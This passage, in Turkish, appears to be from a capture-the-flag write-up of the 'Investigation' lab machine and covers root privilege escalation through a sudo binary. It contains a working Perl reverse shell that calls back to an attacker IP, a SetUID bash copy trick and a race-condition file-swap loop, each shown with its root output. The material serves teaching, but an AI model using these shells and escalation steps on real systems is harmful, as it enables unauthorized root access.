Bir shell elde etmek için basit bir Perl reverse shell yazacağım (revshells.com'u temel alarak):

```
use Socket;
$i="10.10.14.6";
$p=443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("sh -i");
}
```

Şimdi bunu bir Python web sunucusunda barındırıyorum ve URL'yi buna işaret edecek şekilde `binary`'yi çalıştırıyorum.

```
smorton@investigation:~$ sudo binary 10.10.14.6/shell.pl lDnxUysaQn
Running...
```

Benim sunucumdan alıyor:

```
10.10.11.197 - - [18/Apr/2023 16:07:48] "GET /shell.pl HTTP/1.1" 200 -
```

Ve NC'de bir bağlantı var:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 40802
# id
uid=0(root) gid=0(root) groups=0(root)
```

Ve root.txt dosyasını okuyabiliyorum:

```
# cd /root
# cat root.txt
e9f2ff77************************
```


#### Bash [Option 2]

Ippsec, bana `perl script.sh` komutunun, script dosyasındaki **shebang** satırını dikkate aldığını belirtti. Yani, eğer `script.sh` dosyası `#!/bin/bash` ile başlıyorsa, **perl** bu komutu **bash**'e iletecek ve bash tarafından çalıştırılmasını sağlayacaktır.

Bu, `shell.sh` adında bir script oluşturarak, **SetUID** özelliğine sahip bir **bash** kopyası yaratabileceğim anlamına geliyor.

```
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
```

Bunu aynı şekilde çalıştırmak işe yarar:

```
smorton@investigation:~$ sudo binary 10.10.14.6/shell.sh lDnxUysaQn
Running... 
smorton@investigation:~$ /tmp/0xdf -p
0xdf-5.0# 
```


#### Race Condition [Option 3]

Bu binary’yi kötüye kullanmak için bir **race condition** (yarış durumu) da istismar edilebilir. Binary, dosyayı alıp kaydettikten sonra bazı string uzunluğu hesaplamaları yapar, bir string oluşturur ve ardından bu stringi çalıştırmak için **system** fonksiyonunu çağırır. **curl** ve **system** çağrıları arasında, dosya mevcut dizinde kaydedildiği için (ve bu dizin mevcut kullanıcıma aitse), bu dosyaları sahip olmasam veya üzerine yazma yetkim olmasa bile taşıyabilirim.

Bunu göstermek için, bir Python web sunucusu yerine **nc** ile 80 numaralı portta dinleme yapacağım. Binary’yi çalıştırdığımda, bağlantı kurar ve sunucunun yanıt vermesini bekleyerek askıda kalır. Bu noktada, çıktı dosyası oluşturulmuş ve boştur.

```
smorton@investigation:~$ ls -l lDnxUysaQn 
-rw-r--r-- 1 root root 0 Apr 18 20:44 lDnxUysaQn
```

Ona yazamıyorum ama hareket ettirebiliyorum:

```
smorton@investigation:~$ echo "test" > lDnxUysaQn 
-bash: lDnxUysaQn: Permission denied
smorton@investigation:~$ mv lDnxUysaQn 0xdf
smorton@investigation:~$ ls
0xdf  user.txt
```

Bunu kötüye kullanmak için, çalıştırmak istediğim bir script oluşturacağım:

```
#!/bin/bash

id
echo "pwned"
```

Şimdi Investigation üzerinde iki shell çalıştıracağım. İlkinde sonsuz bir döngü çalıştıracağım:

```
smorton@investigation:~$ while :; do if [ -f lDnxUysaQn ]; then mv -f lDnxUysaQn garbage ; cp -f 0xdf.sh lDnxUysaQn; sleep 1; rm lDnxUysaQn; fi; done
```

Bu, `lDnxUysaQn` dosyasının varlığını kontrol eder; eğer mevcutsa, onu `garbage` adında bir dosyaya taşır ve yerine `0xdf.sh` dosyasını kopyalar. Ardından, bir saniye bekler ve bu dosyayı siler.

Şimdi, `binary`'yi çalıştırdığımda dosyanın içeriği önemli değildir, ancak dosyanın var olması gerekir (çünkü bu, **curl**'un başarılı dönmesini sağlar ve dosya çalıştırılır). Bunu çalıştırdığımda:

```
smorton@investigation:~$ sudo binary 10.10.14.6/race lDnxUysaQn
Running... 
uid=0(root) gid=0(root) groups=0(root)
pwned
```

Her zaman tetiklenmeyebilir, ancak benim için çoğu zaman işe yaradı. Çünkü dosyanın görünmesini bekliyor, bu nedenle zamanlama öyle ayarlanmış ki, dosya tam zamanında taşınır.